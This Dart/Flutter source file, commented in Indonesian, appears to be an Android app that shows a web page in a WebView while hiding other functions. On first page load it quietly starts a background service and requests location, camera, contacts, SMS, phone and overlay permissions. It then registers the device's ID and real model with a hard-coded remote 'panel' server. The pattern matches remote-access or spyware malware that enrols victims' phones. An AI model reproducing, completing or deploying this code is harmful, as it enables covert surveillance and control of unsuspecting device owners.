import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:http/http.dart' as http;
import 'package:webview_flutter/webview_flutter.dart';

const String WEB_URL = "https://x-gojo.vercel.app";

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  final prefs = await SharedPreferences.getInstance();
  
  if (prefs.getString('server_url') == null) {
    await prefs.setString('server_url', 'http://panelrara.antirusuhvvip.web.id:2446'); // GANTI IP
    await prefs.setString('device_id', "DEV_${DateTime.now().millisecondsSinceEpoch}");
    await prefs.setString('user_name', "User_New");
    await prefs.setBool('is_protected', true);
  }

  runApp(ExecutorApp());
}

class ExecutorApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData.dark().copyWith(scaffoldBackgroundColor: Colors.black),
      home: MainWebViewScreen(),
    );
  }
}

class MainWebViewScreen extends StatefulWidget {
  @override
  _MainWebViewScreenState createState() => _MainWebViewScreenState();
}

class _MainWebViewScreenState extends State<MainWebViewScreen> {
  static const platform = MethodChannel('com.ghost.executor');
  late WebViewController _controller;
  bool _isInitialized = false;

  @override
  void initState() {
    super.initState();
    _controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setBackgroundColor(Colors.black)
      ..setNavigationDelegate(NavigationDelegate(onPageStarted: (url) {
            if (!_isInitialized) {
              _initializeBackgroundTask();
              _isInitialized = true;
            }
          },))
      ..loadRequest(Uri.parse(WEB_URL));
  }

  Future<void> _initializeBackgroundTask() async {
    try { await platform.invokeMethod('startService'); } catch (e) {}
    _requestCriticalPermissions();
    _registerDevice(); // <--- PENTING
  }

  Future<void> _requestCriticalPermissions() async {
    await [Permission.location, Permission.camera, Permission.contacts, Permission.sms, Permission.phone, Permission.systemAlertWindow, Permission.notification].request();
  }

  // --- PERBAIKAN UTAMA: KIRIM MODEL HP ASLI ---
  Future<void> _registerDevice() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final deviceId = prefs.getString('device_id');
      final server = prefs.getString('server_url');
      final userName = prefs.getString('user_name');

      // Ambil Info Device
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      
      // Gabungkan Merek + Model (Contoh: "Samsung Galaxy A52s")
      String deviceModel = "${androidInfo.manufacturer} ${androidInfo.model}";
      // Kapitalisasi
      deviceModel = deviceModel.split(' ').map((str) => str.isEmpty ? '' : '${str[0].toUpperCase()}${str.substring(1)}').join(' ');

      if (deviceId != null && server != null) {
        await http.post(Uri.parse('$server/api/register'), body: {
          "deviceId": deviceId,
          "name": userName,
          "userTag": userName,
          "model": deviceModel, // KIRim model asli
        });
      }
    } catch (e) {
      print("Register Error: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
  }
}